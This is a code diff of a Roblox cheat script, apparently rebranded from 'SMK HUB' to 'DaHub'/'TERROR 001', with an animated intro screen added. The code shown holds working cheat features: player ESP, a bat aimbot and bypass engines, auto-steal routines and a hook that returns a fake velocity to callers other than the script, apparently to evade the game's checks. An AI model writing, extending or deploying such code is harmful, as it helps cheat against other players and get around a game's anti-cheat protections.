+										frame2.BackgroundTransparency = v76[168]
+										frame2.BorderSizePixel = 0
+										frame2.AnchorPoint = Vector2.new(0.5, 0.5)
+										frame2.Position = UDim2.fromScale(0.5, 0.43)
+										frame2.Size = flag19 and UDim2.fromOffset(340, 105) or UDim2.fromOffset(820, 230)
+										frame2.ClipsDescendants = false
+										frame2.ZIndex = 1003
+										frame2.Parent = instance
+										local uiScale = Instance.new("UIScale")
+										uiScale.Scale = 0.86
+										uiScale.Parent = frame2
+										local tbl25 = {}
+
+										local tbl26 = {
+											id = 116838820706368,
+											from = Vector2.new(-v76[13], 0.2),
+											final = Vector2.new(0.08, 0.5),
+											rotation = -v76[6],
+											delay = 0.02,
+										}
+
+										local tbl27 = {
+											id = 100562870418590,
+											from = Vector2.new(0.3, -0.55),
+											final = Vector2.new(0.245, 0.5),
+											rotation = 20,
+											delay = 0.12,
+										}
+
+										local tbl28 = {
+											id = 139374055352240,
+											from = Vector2.new(1.42, 0.3),
+											final = Vector2.new(0.41, 0.5),
+											rotation = -22,
+											delay = 0.22,
+										}
+
+										local tbl29 = {
+											id = 102192810852440,
+											from = Vector2.new(0.68, 1.55),
+											final = Vector2.new(0.575, 0.5),
+											rotation = 27,
+											delay = 0.32,
+										}
+
+										local tbl30 = {
+											id = 112072591999551,
+											from = Vector2.new(1.48, -0.42),
+											final = Vector2.new(0.74, 0.5),
+											rotation = 18,
+											delay = 0.42,
+										}
+										local tbl32 = {
+											id = 92498386894715,
+											from = Vector2.new(-0.35, 1.35),
+											final = Vector2.new(0.905, 0.5),
+											rotation = -14,
+											delay = 0.52,
+										}
+
+										for i = 1, #DaHubBrandStyle.text do
+										    local source = ({tbl26, tbl27, tbl28, tbl29, tbl30, tbl32})[(i - 1) % 6 + 1]
+										    tbl25[i] = {
+										        from = source.from,
+										        final = Vector2.new((i - 0.5) / #DaHubBrandStyle.text, 0.5),
+										        rotation = source.rotation,
+										        delay = (i - 1) * 0.06,
+										    }
+										end
+										local tbl31 = {}
+
+										for i, v94 in ipairs(tbl25) do
+											local frame3 = Instance.new("Frame")
+											frame3.BackgroundTransparency = 1
+											frame3.BorderSizePixel = 0
+											frame3.AnchorPoint = Vector2.new(0.5, 0.5)
+											frame3.Position = UDim2.fromScale(v94.from.X, v94.from.Y)
+											frame3.Size = UDim2.fromScale(1 / #DaHubBrandStyle.text, v76[168])
+											frame3.Rotation = v94.rotation
+											frame3.ZIndex = 1003 + i
+											frame3.Parent = frame2
+											local imageLabel = Instance.new("TextLabel")
+											imageLabel.BackgroundTransparency = 1
+											imageLabel.BorderSizePixel = 0
+											imageLabel.Text = string.sub(DaHubBrandStyle.text, i, i)
+											imageLabel.Font = Enum.Font.GothamBlack
+											imageLabel.TextScaled = true
+											imageLabel.TextColor3 = Color3.fromRGB(255, 246, 220)
+											imageLabel.TextTransparency = v76[168]
+											imageLabel.AnchorPoint = Vector2.new(0.5, 0.5)
+											imageLabel.Position = UDim2.fromScale(0.5, 0.5)
+											imageLabel.Size = UDim2.fromScale(1, v76[168])
+											imageLabel.ZIndex = 1004 + i
+											imageLabel.Parent = frame3
+											imageLabel.TextSize = flag19 and 100 or 230
+											DaHubBrandStyle.apply(imageLabel)
+											local christmasGradient = Instance.new("UIGradient", imageLabel)
+											christmasGradient.Name = "001NeonShine"
+											christmasGradient.Color = ColorSequence.new({
+											    ColorSequenceKeypoint.new(0, Color3.fromRGB(255, 255, 255)),
+											    ColorSequenceKeypoint.new(0.5, Color3.fromRGB(0, 0, 0)),
+											    ColorSequenceKeypoint.new(1, Color3.fromRGB(0, 0, 0)),
+											})
+											christmasGradient.Rotation = 90
+											tbl31[i] = { slot = frame3, image = imageLabel, spec = v94 }
+										end
+
+										local textLabel = Instance.new("TextLabel")
+										textLabel.BackgroundTransparency = v76[168]
+										textLabel.Text = "TAP ANYWHERE TO SKIP"
+										textLabel.TextColor3 = Color3.fromRGB(240, 240, 244)
+										textLabel.TextTransparency = 1
+										textLabel.TextSize = flag19 and 16 or 20
+										textLabel.Font = Enum.Font.GothamMedium
+										textLabel.AnchorPoint = Vector2.new(0.5, v76[164])
+										textLabel.Position = flag19 and UDim2.new(0.5, 0, 0.43, 82) or UDim2.new(0.5, 0, 0.43, 155)
+										textLabel.Size = UDim2.new(0.8, 0, 0, 24)
+										textLabel.ZIndex = 1010
+										textLabel.Parent = instance
+										local textLabel2 = Instance.new("TextLabel")
+										textLabel2.BackgroundTransparency = 1
+										textLabel2.Text = "by Davy..."
+										textLabel2.TextColor3 = Color3.fromRGB(166, 168, 178)
+										textLabel2.TextTransparency = 1
+										textLabel2.TextSize = flag19 and 14 or 18
+										textLabel2.Font = Enum.Font.GothamMedium
+										textLabel2.AnchorPoint = Vector2.new(0.5, v76[164])
+										textLabel2.Position = flag19 and UDim2.new(0.5, 0, 0.43, 102) or UDim2.new(0.5, 0, 0.43, 183)
+										textLabel2.Size = UDim2.new(0.8, 0, 0, 22)
+										textLabel2.ZIndex = 1010
+										textLabel2.Parent = instance
+										local instance2 = Instance.new(v76[150])
+										instance2.BackgroundTransparency = 1
+										instance2.Text = ""
+										instance2.AutoButtonColor = false
+										instance2.Size = UDim2.fromScale(v76[168], 1)
+										instance2.ZIndex = 1011
+										instance2.Parent = instance
+										local blurEffect = Instance.new("BlurEffect")
+										blurEffect.Name = "VantaLoadIntroBlur"
+										blurEffect.Size = v76[175]
+										blurEffect.Parent = Lighting
+										local flag20 = true
+										local flag21 = false
+
+										local function fn33(arg2)
+											local n33 = math.clamp(arg2, 0, v76[168])
+											return n33 * n33 * (v76[20] - 2 * n33)
+										end
+
+										local function fn34(arg2, arg3, arg4, arg5)
+											local n33 = 1 - arg5
+											return Vector2.new(n33 * n33 * arg2.X + v76[89] * n33 * arg5 * arg3.X + arg5 * arg5 * arg4.X, n33 * n33 * arg2.Y + 2 * n33 * arg5 * arg3.Y + arg5 * arg5 * arg4.Y)
+										end
+
+										local function fn35()
+											if flag21 then
+												return
+											end
+											flag21 = true
+											flag20 = false
+											stopIntroMusic()
+											local tweenInfo = TweenInfo.new(0.42, Enum.EasingStyle.Quad, Enum.EasingDirection.Out)
+
+
+											TS_G:Create(instance, tweenInfo, { BackgroundTransparency = 1 }):Play()
+											TS_G:Create(uiScale, tweenInfo, { Scale = 0.72 }):Play()
+											TS_G:Create(blurEffect, tweenInfo, { Size = 0 }):Play()
+											TS_G:Create(textLabel, tweenInfo, { TextTransparency = v76[168] }):Play()
+											TS_G:Create(textLabel2, tweenInfo, { TextTransparency = 1 }):Play()
+
+											for _, v94 in ipairs(tbl24) do
+												TS_G:Create(v94.frame, tweenInfo, { BackgroundTransparency = 1 }):Play()
+											end
+
+											for _, v94 in ipairs(tbl31) do
+												TS_G:Create(v94.image, tweenInfo, { TextTransparency = 1 }):Play()
+											end
+
+											task.delay(0.42, function()
+												if screenGui.Parent then
+													screenGui:Destroy()
+												end
+
+												if blurEffect.Parent then
+													blurEffect:Destroy()
+												end
+
+												_G._VantaLoadIntroCleanup = nil
+
+												if onFinished then
+													onFinished()
+												end
+											end)
+										end
+
+										_G._VantaLoadIntroCleanup = function()
+											flag20 = v76[104]
+											flag21 = true
+											stopIntroMusic()
+
+
+											if screenGui.Parent then
+												screenGui:Destroy()
+											end
+
+											if blurEffect.Parent then
+												blurEffect:Destroy()
+											end
+										end
+
+										instance2.Activated:Connect(fn35)
+										TS_G:Create(instance, TweenInfo.new(0.25, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), { BackgroundTransparency = 0.5 }):Play()
+										TS_G:Create(blurEffect, TweenInfo.new(0.25, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), { Size = 10 }):Play()
+										TS_G:Create(textLabel, TweenInfo.new(0.25), { TextTransparency = 0.22 }):Play()
+										TS_G:Create(textLabel2, TweenInfo.new(0.25), { TextTransparency = 0.18 }):Play()
+
+										task.spawn(function()
+											local now2 = os.clock()
+
+											while flag20 and not flag21 do
+												local n33 = os.clock() - now2
+												local v94 = fn33((n33 - 0.38) / 0.9)
+												local n34 = math.sin(n33 * 1.62) * v94
+												local n35 = math.sin(n33 * 3.24) * v94
+												uiScale.Scale = 0.86 + fn33(n33 / 0.78) * 0.14 + n34 * 0.012
+												local v95 = fn33(n33 / 0.42)
+
+												for _, v96 in ipairs(tbl24) do
+													local n36 = (v96.x + n33 * v96.speed) % 1.12 - 0.06
+													local n37 = v96.y + math.sin(n33 * 0.78 + v96.phase) * 0.012
+													local n38 = (math.sin(n33 * v76[89] + v96.phase) + 1) * 0.5
+													v96.frame.Position = UDim2.fromScale(n36, n37)
+													v96.frame.BackgroundTransparency = v76[168] - v95 * (v96.opacity + n38 * v76[10])
+												end
+
+												for i, v96 in ipairs(tbl31) do
+													local spec = v96.spec
+													local n36 = i - 3
+													local n37 = math.abs(n36) / 2
+													local n38 = math.clamp((n33 - spec.delay) / 0.96, 0, 1)
+													local n39 = 1 - (v76[168] - n38) ^ 3
+													local v97 = fn34(spec.from, Vector2.new((spec.from.X + spec.final.X) * 0.5 - n36 * 0.08, (spec.from.Y + spec.final.Y) * 0.5 + (i % v76[89] == 0 and -0.23 or 0.23)), spec.final, n39)
+													v96.slot.Position = UDim2.fromScale(v97.X + n36 * n34 * 0.009, v97.Y + (n37 * n37 * v76[1] - v76[14]) * n34 / 230 + n35 * (1 - n37) * 2.4 / 230)
+													v96.slot.Size = UDim2.fromScale(0.16 * (v76[168] + n34 * (0.035 + n37 * 0.055)), 1 - n34 * (0.028 + n37 * 0.045))
+													v96.slot.Rotation = spec.rotation * (v76[168] - n39) + n36 * n34 * 5.8 + n35 * (v76[168] - n37) * 0.8
+													local v98 = math.sin(n33 * 2.85 + i * 0.82)
+													local v99 = math.sin(n33 * 2.1 + i * 0.64)
+													v96.image.Position = UDim2.new(0.5, 0, 0.5, v99 * 1.35)
+													v96.image.Size = UDim2.fromScale(1 + v98 * 0.026, 1 - v98 * 0.038)
+													v96.image.Rotation = v99 * 0.9
+													v96.image.TextTransparency = 1 - fn33((n38 - 0.02) / 0.18)
+												end
+
+												RunService.RenderStepped:Wait()
+											end
+										end)
+
+										task.delay(v76[100], fn35)
+									end
+
+local function clearOldDaHubInterface()
+    if type(_G._DaHubBatBypassCleanup) == "function" then
+        pcall(_G._DaHubBatBypassCleanup)
+        _G._DaHubBatBypassCleanup = nil
     end
     local playerGui = LP:WaitForChild("PlayerGui")
     local roots = {playerGui}
@@ -1196,7 +594,7 @@ local function clearOldSMKInterface()
     if coreOk and coreGui then table.insert(roots, coreGui) end
 
     for _, root in ipairs(roots) do
-        for _, guiName in ipairs({"SMK", "SMKStealHUD", "StealBarMovableSmall", "SMK_FloatingPanel", "FloatingModeMenu", "BrainrotIntroGui"}) do
+        for _, guiName in ipairs({"DaHub", "DaHubStealHUD", "StealBarMovableSmall", "DaHub_FloatingPanel", "FloatingModeMenu", "BrainrotIntroGui"}) do
             local oldGui = root:FindFirstChild(guiName)
             if oldGui then pcall(function() oldGui:Destroy() end) end
         end
@@ -1204,11 +602,11 @@ local function clearOldSMKInterface()
 
     local character = LP.Character
     local head = character and character:FindFirstChild("Head")
-    local oldBillboard = head and head:FindFirstChild("SMKSpeedBB")
+    local oldBillboard = head and head:FindFirstChild("DaHubSpeedBB")
     if oldBillboard then oldBillboard:Destroy() end
 end
 
-clearOldSMKInterface()
+clearOldDaHubInterface()
 
 removedAccessories = {}
 
@@ -1242,7 +640,7 @@ S = {
     espEnabled = false, espPlayerCache = {players = {}, addConn = nil, remConn = nil, colorConn = nil, _colorAcc = 0}, setESPVisual = nil,
     NS = 70, CS = 45, LS = 22, LCS = 22,
     speedMode = false, laggerMode = 0,
-    antiRagdollEnabled = false, antiBatEnabled = false, antiBatConnections = {}, antiBatHeartbeat = nil, antiBatCharacterConn = nil, medusaCounterEnabled = false,
+    antiRagdollEnabled = false, medusaCounterEnabled = false,
     medusaDebounce = false, medusaLastUsed = 0, medusaConns = {}, MEDUSA_COOLDOWN = 25,
     unwalkEnabled = false,
     autoLeftEnabled = false, autoRightEnabled = false,
@@ -1281,8 +679,6 @@ S = {
     normalBox = nil, carryBox = nil, laggerBox = nil,
     radInput = nil, setLockUI_Visual = nil, setHideOpiumButtons = nil,
     holdJumpEnabled = false, holdJumpConn = nil, setHoldJumpVisual = nil,
-    antiDropEnabled = false, setAntiDropVisual = nil,
-    antiDieEnabled = false, setAntiDieVisual = nil,
     stealDurationBox = nil,
     hudBgLabel = nil,
     hudBarPos = nil,
@@ -1355,14 +751,14 @@ S = {
 PLAYER_ESP_COLOR = Color3.fromRGB(255, 255, 255)
 PLAYER_ESP_FILL_TRANSPARENCY = 0.7
 PLAYER_ESP_OUTLINE_TRANSPARENCY = 0.3
-PLAYER_ESP_BIND_NAME = "SMK_VX7_PlayerESP"
+PLAYER_ESP_BIND_NAME = "DaHub_VX7_PlayerESP"
 
 local function ensurePlayerESPGui()
     local cache = S.espPlayerCache
     if cache.screenGui and cache.screenGui.Parent then return cache.screenGui end
     local playerGui = LP:FindFirstChildOfClass("PlayerGui") or LP:WaitForChild("PlayerGui")
     local screenGui = Instance.new("ScreenGui")
-    screenGui.Name = "SMK_VX7_PlayerESP"
+    screenGui.Name = "DaHub_VX7_PlayerESP"
     screenGui.ResetOnSpawn = false
     screenGui.DisplayOrder = 998
     screenGui.IgnoreGuiInset = true
@@ -1690,10 +1086,10 @@ AUTO_BAT_SPEED, AUTO_BAT_VERT_SPEED, AUTO_BAT_DIST, AUTO_BAT_HEIGHT, AUTO_BAT_V_
 S.ui = function(pcVal, mobVal) return S.IS_MOBILE and mobVal or pcVal end
 local function applyPhoneGuiScale(frame, scaleValue, storeKey)
     if not frame then return end
-    local scaleObj = frame:FindFirstChild("SMKPhoneScale")
+    local scaleObj = frame:FindFirstChild("DaHubPhoneScale")
     if not scaleObj then
         scaleObj = Instance.new("UIScale")
-        scaleObj.Name = "SMKPhoneScale"
+        scaleObj.Name = "DaHubPhoneScale"
         scaleObj.Parent = frame
     end
     scaleObj.Scale = S.IS_TOUCH_DEVICE and scaleValue or 1
@@ -2039,7 +1435,6 @@ end
 					if
 						(arg2 == "AssemblyLinearVelocity" or arg2 == "Velocity")
 						and not checkcaller()
-						and S.antiDropEnabled
 						and (rawequal(arg, humanoidRootPart2))
 					then
 						return _G.fakeVelocity
@@ -2050,7 +1445,6 @@ end
 					if
 						(arg2 == "AssemblyLinearVelocity" or arg2 == "Velocity")
 						and not checkcaller()
-						and S.antiDropEnabled
 						and (rawequal(arg, humanoidRootPart2))
 					then
 						_G.fakeVelocity = fakeVelocity_
@@ -2238,13 +1632,13 @@ end
 S.setupSpeedBillboard = function(char)
     local head = char and (char:FindFirstChild("Head") or char:WaitForChild("Head", 5))
     if not head then return end
-    local oldBB = head:FindFirstChild("SMKSpeedBB")
+    local oldBB = head:FindFirstChild("DaHubSpeedBB")
     if oldBB then oldBB:Destroy() end
 
     -- Colores tomados del indicador sobre la cabeza de Ace Duels (tema 2):
     -- pale 210,218,228 -> accent 104,116,132 -> accent2 156,169,186.
     local bb = Instance.new("BillboardGui", head)
-    bb.Name = "SMKSpeedBB"
+    bb.Name = "DaHubSpeedBB"
     bb.Size = UDim2.fromOffset(118, 36)
     bb.StudsOffset = Vector3.new(0, 1.75, 0)
     bb.AlwaysOnTop = true
@@ -2262,21 +1656,14 @@ S.setupSpeedBillboard = function(char)
         return gradient
     end
 
-    local discordLbl = Instance.new("TextLabel", bb)
+    local discordLbl = Instance.new("ImageLabel", bb)
     discordLbl.Name = "DiscordBillLbl"
     discordLbl.Size = UDim2.new(1, 0, 0.46, 0)
     discordLbl.BackgroundTransparency = 1
-    discordLbl.Text = "ＳＭＫㅤＨＵＢ"
+    discordLbl.Image = TERROR_LOGO_IMAGE
+    discordLbl.ImageColor3 = Color3.fromRGB(255, 255, 255)
+    discordLbl.ScaleType = Enum.ScaleType.Fit
     discordLbl:SetAttribute("DiscordInviteURL", DISCORD_INVITE_URL)
-    discordLbl.Font = Enum.Font.GothamBlack
-    discordLbl.TextScaled = true
-    discordLbl.TextColor3 = Color3.fromRGB(255, 255, 255)
-    discordLbl.TextStrokeTransparency = 0
-    discordLbl.TextStrokeColor3 = Color3.fromRGB(0, 0, 0)
-    local discordSize = Instance.new("UITextSizeConstraint", discordLbl)
-    discordSize.MinTextSize = 4
-    discordSize.MaxTextSize = 12
-    SMKBrandStyle.apply(discordLbl)
 
     local speedLbl = Instance.new("TextLabel", bb)
     speedLbl.Name = "SpeedBillLbl"
@@ -2311,8 +1698,8 @@ end
 
 
 -- Ragdoll Timer tomado únicamente de Ace Duels.
--- Es independiente del indicador de Discord/Speed de SMK.
-smkRagdollTimer = {
+-- Es independiente del indicador de Discord/Speed de DaHub.
+daHubRagdollTimer = {
     billboard = nil,
     label = nil,
     character = nil,
@@ -2325,17 +1712,17 @@ smkRagdollTimer = {
     connection = nil,
 }
 
-local function setupSMKRagdollTimer(char)
+local function setupDaHubRagdollTimer(char)
     local head = char and (char:FindFirstChild("Head") or char:WaitForChild("Head", 5))
     if not head then return end
-    local old = head:FindFirstChild("SMKRagdollTimerBB")
+    local old = head:FindFirstChild("DaHubRagdollTimerBB")
     if old then old:Destroy() end
-    if smkRagdollTimer.connection then
-        pcall(function() smkRagdollTimer.connection:Disconnect() end)
-        smkRagdollTimer.connection = nil
+    if daHubRagdollTimer.connection then
+        pcall(function() daHubRagdollTimer.connection:Disconnect() end)
+        daHubRagdollTimer.connection = nil
     end
     local bb = Instance.new("BillboardGui", head)
-    bb.Name = "SMKRagdollTimerBB"
+    bb.Name = "DaHubRagdollTimerBB"
     bb.Size = UDim2.fromOffset(112, 28)
     bb.StudsOffset = Vector3.new(0, 4.45, 0)
     bb.AlwaysOnTop = true
@@ -2361,14 +1748,14 @@ local function setupSMKRagdollTimer(char)
         ColorSequenceKeypoint.new(0.5, Color3.fromRGB(235, 235, 235)),
         ColorSequenceKeypoint.new(1, Color3.fromRGB(170, 170, 170)),
     })
-    smkRagdollTimer.billboard = bb
-    smkRagdollTimer.label = label
-    smkRagdollTimer.character = char
-    smkRagdollTimer.active = false
-    smkRagdollTimer.startTime = 0
-    smkRagdollTimer.endTime = 0
-    smkRagdollTimer.goUntil = 0
-    smkRagdollTimer.wasRagdolled = false
+    daHubRagdollTimer.billboard = bb
+    daHubRagdollTimer.label = label
+    daHubRagdollTimer.character = char
+    daHubRagdollTimer.active = false
+    daHubRagdollTimer.startTime = 0
+    daHubRagdollTimer.endTime = 0
+    daHubRagdollTimer.goUntil = 0
+    daHubRagdollTimer.wasRagdolled = false
 
     local function isRagdolled(humanoid)
         if not humanoid then return false end
@@ -2379,37 +1766,37 @@ local function setupSMKRagdollTimer(char)
             or state == Enum.HumanoidStateType.FallingDown
     end
 
-    smkRagdollTimer.connection = RunService.Heartbeat:Connect(function()
-        if smkRagdollTimer.character ~= char or not bb.Parent or not label.Parent then return end
+    daHubRagdollTimer.connection = RunService.Heartbeat:Connect(function()
+        if daHubRagdollTimer.character ~= char or not bb.Parent or not label.Parent then return end
         local humanoid = char:FindFirstChildOfClass("Humanoid")
         if not humanoid or humanoid.Health <= 0 then
             label.Text = ""
-            smkRagdollTimer.active = false
+            daHubRagdollTimer.active = false
             return
         end
         local now = os.clock()
         local ragdolled = isRagdolled(humanoid)
-        if ragdolled and not smkRagdollTimer.wasRagdolled and not smkRagdollTimer.active and smkRagdollTimer.goUntil <= now then
-            smkRagdollTimer.active = true
-            smkRagdollTimer.startTime = now
-            smkRagdollTimer.endTime = now + smkRagdollTimer.duration
-            label.Text = string.format("%.1f", smkRagdollTimer.duration)
+        if ragdolled and not daHubRagdollTimer.wasRagdolled and not daHubRagdollTimer.active and daHubRagdollTimer.goUntil <= now then
+            daHubRagdollTimer.active = true
+            daHubRagdollTimer.startTime = now
+            daHubRagdollTimer.endTime = now + daHubRagdollTimer.duration
+            label.Text = string.format("%.1f", daHubRagdollTimer.duration)
         end
-        if smkRagdollTimer.active then
-            local remaining = smkRagdollTimer.endTime - now
+        if daHubRagdollTimer.active then
+            local remaining = daHubRagdollTimer.endTime - now
             if remaining <= 0 then
-                smkRagdollTimer.active = false
-                smkRagdollTimer.goUntil = now + 0.65
+                daHubRagdollTimer.active = false
+                daHubRagdollTimer.goUntil = now + 0.65
                 label.Text = "GO"
             else
                 label.Text = string.format("%.1f", remaining)
             end
-        elseif smkRagdollTimer.goUntil > now then
+        elseif daHubRagdollTimer.goUntil > now then
             label.Text = "GO"
         else
             label.Text = ""
         end
-        smkRagdollTimer.wasRagdolled = ragdolled
+        daHubRagdollTimer.wasRagdolled = ragdolled
     end)
 end
 
@@ -2426,7 +1813,7 @@ stopDropBrainrot = nil
 startAutoLeft, stopAutoLeft, startAutoRight, stopAutoRight = nil, nil, nil, nil
 
 -- Instant Reset adapted from Ace Duels.
--- Uses Ace's pulse/queue/camera flow and SMK's local guard APIs.
+-- Uses Ace's pulse/queue/camera flow and DaHub's local guard APIs.
 aceInstaResetState = _G._AceInstaResetState or {}
 _G._AceInstaResetState = aceInstaResetState
 
@@ -2454,7 +1841,7 @@ local function registerResetConnection(connection)
     return connection
 end
 
-local function suspendSMKGuards()
+local function suspendDaHubGuards()
     local state = {antiRagdoll = false, batCounter = false, batAimbot = false, autoLeft = false, autoRight = false, movement = false}
     if S.antiRagdollEnabled then
         state.antiRagdoll = true
@@ -2499,7 +1886,7 @@ local function suspendSMKGuards()
     return state
 end
 
-local function restoreSMKGuards(state)
+local function restoreDaHubGuards(state)
     state = state or aceInstaResetState.suspended or {}
     aceInstaResetState.suspended = nil
     if state.antiRagdoll then
@@ -2639,7 +2026,7 @@ local function aceInstantReset()
     aceInstaResetState.token += 1
     local token = aceInstaResetState.token
     S._youtResetInProgress = true
-    local suspended = suspendSMKGuards()
+    local suspended = suspendDaHubGuards()
     task.spawn(function()
         pcall(function()
             holdResetCamera(character)
@@ -2657,7 +2044,7 @@ local function aceInstantReset()
         releaseResetCamera()
         aceInstaResetState.busy = false
         S._youtResetInProgress = false
-        restoreSMKGuards(suspended)
+        restoreDaHubGuards(suspended)
     end)
 end
 
@@ -2667,7 +2054,7 @@ registerResetConnection(resetHeartbeat:Connect(function()
         aceInstaResetState.busy = false
         releaseResetCamera()
         S._youtResetInProgress = false
-        restoreSMKGuards()
+        restoreDaHubGuards()
     end
 end))
 
@@ -2704,7 +2091,7 @@ local function sourceInstaResetTrigger()
 end
 _G.InstaReset = {Trigger = sourceInstaResetTrigger}
 _G.VynxDoInstaReset = _G.InstaReset.Trigger
-_G.smkInstantReset = _G.InstaReset.Trigger
+_G.daHubInstantReset = _G.InstaReset.Trigger
 -- Rebind the camera to the Humanoid whenever the character respawns.
 LP.CharacterAdded:Connect(function(character)
     task.defer(function()
@@ -2812,7 +2199,7 @@ local function runDropBrainrot()
                 local velocity = root.AssemblyLinearVelocity
                 root.AssemblyLinearVelocity = Vector3.new(velocity.X, 160, velocity.Z)
             end)
-            if not ok then finishDrop(true); warn("[ＳＭＫㅤＨＵＢ] Jump Drop: " .. tostring(err)) end
+            if not ok then finishDrop(true); warn("[TERROR 001] Jump Drop: " .. tostring(err)) end
         end)
         S._dropConn = connection
         timeout = task.delay(0.35, function() finishDrop(true) end)
@@ -2836,7 +2223,7 @@ local function runDropBrainrot()
             end
         end)
         finishDrop(LP.Character == character)
-        if not ok then warn("[ＳＭＫㅤＨＵＢ] Fling Drop: " .. tostring(err)) end
+        if not ok then warn("[TERROR 001] Fling Drop: " .. tostring(err)) end
     end)
     S._dropThread = worker
     timeout = task.delay(0.35, function() finishDrop(true) end)
@@ -2907,7 +2294,7 @@ S.restartMovement = function() S.stopMovement(); S.startMovement() end
 S.speedEnabled = true
 S.startMovement()
 
--- ── Hold Jump (ported from the attached SMK; standalone Infinite Jump removed) ──
+-- ── Hold Jump (ported from the attached DaHub; standalone Infinite Jump removed) ──
 S.holdJumpPower = 55
 S.holdJumpMinVelocity = 35
 S.holdJumpFallClamp = -120
@@ -3368,8 +2755,8 @@ end
 
 
 YF = {}
--- Yout-to-SMK ports: Anti Fling, Lock Enemy, Anim Pack, and Anti Lag.
--- Anti Fling and Lock Enemy, adapted to SMK's state and movement system.
+-- Yout-to-DaHub ports: Anti Fling, Lock Enemy, Anim Pack, and Anti Lag.
+-- Anti Fling and Lock Enemy, adapted to DaHub's state and movement system.
 YF.antiFlingState = {connection = nil, threshold = 80, spinThreshold = 40}
 function YF.startAntiFling()
     S.antiFlingEnabled = true
@@ -3817,7 +3204,7 @@ function YF._alIsProtectedVisual(object)
         end
         local name = parent.Name or ""
         if name:match("^Crystal") or name:match("^Eclipse") or name:match("^ESP_")
-            or name:match("^BloodHounds") or name:match("^Yout") or name:match("^SMK") then
+            or name:match("^BloodHounds") or name:match("^Yout") or name:match("^DaHub") then
             return true
         end
         parent = parent.Parent
@@ -4077,7 +3464,7 @@ saveConfig = function()
             hubColor = S.hubColor,
             optimizerMode = S.optimizerMode,
             mobileButtonStyle = S.mobileButtonStyle,
-            hubTitleFont = SMKBrandStyle.fontMode,
+            hubTitleFont = DaHubBrandStyle.fontMode,
             medusaSkin = S.medusaSkinMode or "Off",
             laggerMode = S.speedMode and 0 or S.laggerMode,
             tpDownHeightTrigger = S.tpDownHeightTrigger,
@@ -4110,8 +3497,6 @@ saveConfig = function()
             antiLag = S.antiLagEnabled,
             hideOpiumButtons = S.hideOpiumButtonsEnabled or false,
             holdJumpEnabled = S.holdJumpEnabled,
-            antiDrop = S.antiDropEnabled,
-            antiDie = S.antiDieEnabled,
             batCounter = S.batCounterEnabled,
             stealDuration = S.Steal.StealDuration,
             mobileButtonPositions = S.mobileButtonPositions,
@@ -4586,7 +3971,7 @@ local function queueAutoBatStart()
     enableAutoBat()
 end
 
--- Funcionamento do Bat Aimbot do Empire; o visual e os atalhos do ＳＭＫㅤＨＵＢ são preservados.
+-- Funcionamento do Bat Aimbot do Empire; o visual e os atalhos do TERROR 001 são preservados.
 function S.empireFindBatForAimbot() local char = LP.Character if not char then return nil end for _, tool in ipairs(char:GetChildren()) do if tool:IsA("Tool") and (tool.Name:lower():find("bat") or tool.Name:lower():find("slap")) then return tool end end local bp = LP:FindFirstChild("Backpack") if bp then for _, tool in ipairs(bp:GetChildren()) do if tool:IsA("Tool") and (tool.Name:lower():find("bat") or tool.Name:lower():find("slap")) then return tool end end end return nil end 
 function startBatAimbot()
     if S.batBypassEnabled and S.setBatBypass then S.setBatBypass(false) end
@@ -5092,20 +4477,20 @@ end
 S.toggleBatBypass = function()
     S.setBatBypass(not S.batBypassEnabled)
 end
-_G._SMKBatBypassCleanup = batV2Stop
+_G._DaHubBatBypassCleanup = batV2Stop
 LP.CharacterRemoving:Connect(function()
     if BV2.on then batV2Stop() end
 end)
 end -- prime.vs Bat V2 isolated module
 
--- EMBER V1-V4 + original ＳＭＫㅤＨＵＢ V5. Engines are private and mutually exclusive.
+-- EMBER V1-V4 + original TERROR 001 V5. Engines are private and mutually exclusive.
 do
     local Engines = {}
     local disposed = false
     S.batBypassVersion = S.batBypassVersion or "v5"
     S.batBypassSpeed = S.batBypassSpeed or 58
     local originalSet = S.setBatBypass
-    local originalCleanup = _G._SMKBatBypassCleanup
+    local originalCleanup = _G._DaHubBatBypassCleanup
     local activeEngine = nil
     local v1Connection = nil
     local lastSwing = 0
@@ -5395,7 +4780,7 @@ do
     end
 
     Engines.v2 = AimbotV2
-    -- Engine remains private to ＳＭＫㅤＨＵＢ.
+    -- Engine remains private to TERROR 001.
 end
 
 -- ============================================================
@@ -6113,7 +5498,7 @@ end
         if restart then S.setBatBypass(true) end
         if persist ~= false then saveConfig() end
     end
-    _G._SMKBatBypassCleanup = function()
+    _G._DaHubBatBypassCleanup = function()
         disposed = true
         stopAll()
     end
@@ -6184,7 +5569,7 @@ triggerBatCounter = function(character)
             local bat = findBatForCounter()
             if bat then swingBatForCounter(bat, character) end
         end)
-        if not ok then warn("[ＳＭＫㅤＨＵＢ] Bat Counter error: " .. tostring(err)) end
+        if not ok then warn("[TERROR 001] Bat Counter error: " .. tostring(err)) end
         task.wait(0.3)
         S.batCounterDebounce = false
         if type(_unsuppressBodyLock) == "function" then pcall(_unsuppressBodyLock, true) end
@@ -6264,7 +5649,7 @@ local function useMedusaCounter()
         S.medusaLastUsed = tick()
     elseif not ok and tick() - medusaLastErrorWarn >= 3 then
         medusaLastErrorWarn = tick()
-        warn("[ＳＭＫㅤＨＵＢ] Medusa Counter error: " .. tostring(activated))
+        warn("[TERROR 001] Medusa Counter error: " .. tostring(activated))
     end
 end
 
@@ -6415,7 +5800,7 @@ local function setStealDuration(value, fallback)
     return S.Steal.StealDuration
 end
 
--- YOUT AUTO STEAL integrado en ＳＭＫㅤＨＵＢ (mantiene el menu/HUD original).
+-- YOUT AUTO STEAL integrado en TERROR 001 (mantiene el menu/HUD original).
 -- Se conserva el flujo de robo por fases del codigo Yout: pausa inicial,
 -- espera de proximidad y finalizacion del progreso antes de disparar el prompt.
 autoGrabSetDelayRadius = 9
@@ -6487,7 +5872,7 @@ local function resetCleanStealProgress()
     S.setProgressVisual(0)
 end
 
--- Yout Auto Steal: rutina adaptada a S.Steal y al HUD blanco/negro de ＳＭＫㅤＨＵＢ.
+-- Yout Auto Steal: rutina adaptada a S.Steal y al HUD blanco/negro de TERROR 001.
 local function executeSteal(prompt, podName)
     if S.Steal.isStealing or not prompt then return end
 
@@ -6753,70 +6138,70 @@ end
 
 -- ===========================
 -- ===========================
--- SMK — VERTICAL GUI  (black / grey / red / white)
+-- DaHub — VERTICAL GUI  (black / grey / red / white)
 -- ===========================
 
 -- Paleta do hub independente de imagens de fundo.
-local SMKThemeIndex = 1
-local SMKThemeBases = {}
-local SMKThemeReverse = {}
